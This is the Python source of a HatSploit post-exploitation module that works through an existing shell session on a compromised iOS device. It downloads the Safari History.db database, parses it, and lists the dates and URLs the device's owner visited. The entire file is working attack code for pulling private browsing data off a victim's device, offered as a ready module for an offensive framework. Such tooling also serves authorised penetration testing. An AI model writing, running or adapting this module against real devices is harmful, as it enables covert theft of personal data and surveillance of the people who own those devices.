"""
This module requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.loot import Loot
from hatsploit.lib.module.basic import *
from hatsploit.lib.sessions import Sessions
from pex.db import DB


class HatSploitModule(Module, Sessions, DB):
    def __init__(self):
        super().__init__()

        self.details = {
            'Category': "post",
            'Name': "Obtain Safari history",
            'Module': "post/apple_ios/shell/safari_history",
            'Authors': [
                'Ivan Nikolsky (enty8080) - module developer',
            ],
            'Description': "Get iOS Safari history database and parse it.",
            'Platform': "apple_ios",
            'Rank': "medium",
        }

        self.session = SessionOption(None, "Session to run on.", True,
                                     platforms=['apple_ios'], type='shell')
        self.path = Option(Loot().specific_loot('History.db'), "Path to save file.", True)

    def run(self):
        history = '/private/var/mobile/Library/Safari/History.db'
        path = self.session_download(self.session.value, history, self.path.value)

        if path:
            self.print_process("Parsing history database...")

            try:
                history = self.parse_safari_bookmarks(path)
            except Exception:
                self.print_error("Failed to parse history database!")
                return

            history_data = []
            for item in history:
                history_data.append((item['date'], item['details']['url']))

            if history_data:
                self.print_table("History", ('Date', 'URL'), *history_data)
            else:
                self.print_warning("No history available on device.")
